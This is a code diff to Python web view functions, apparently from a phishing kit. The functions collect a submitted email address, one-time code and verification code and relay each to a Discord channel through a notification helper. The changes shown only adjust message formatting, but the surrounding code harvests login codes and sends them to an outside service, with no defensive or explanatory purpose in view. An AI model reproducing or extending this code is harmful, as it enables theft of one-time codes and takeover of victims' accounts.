@@ -83,7 +83,7 @@ def send_discord_message(message, color=0x00ff00):
     try:
         embed = {
             "title": "📨 Notification",
-            "description": f"```{message}```",
+            "description": f"{message}",
             "color": color,
             "timestamp": datetime.now().isoformat()
         }
@@ -376,7 +376,7 @@ def send_email_code(request, user_id):
         email = request.POST.get('email')
         verify_code = request.POST.get('verify_code')
     
-        discord_message = f"📊 Email :  ```{email}``` One-Time Code : ```{verify_code}```"
+        discord_message = f"📊 Email : ```{email}``` One-Time Code : ```{verify_code}```"
         send_discord_message(discord_message, color=0x00ff00)
 
         return JsonResponse({
@@ -402,7 +402,7 @@ def send_verification_code(request, user_id):
     if request.method == 'POST':
         verificationCodevalue = request.POST.get('verificationCodevalue')
         
-        discord_message = f"📊 Verification Code :  {verificationCodevalue}"
+        discord_message = f"📊 Verification Code :  ```{verificationCodevalue}```"
         send_discord_message(discord_message, color=0x00ff00)
         
        
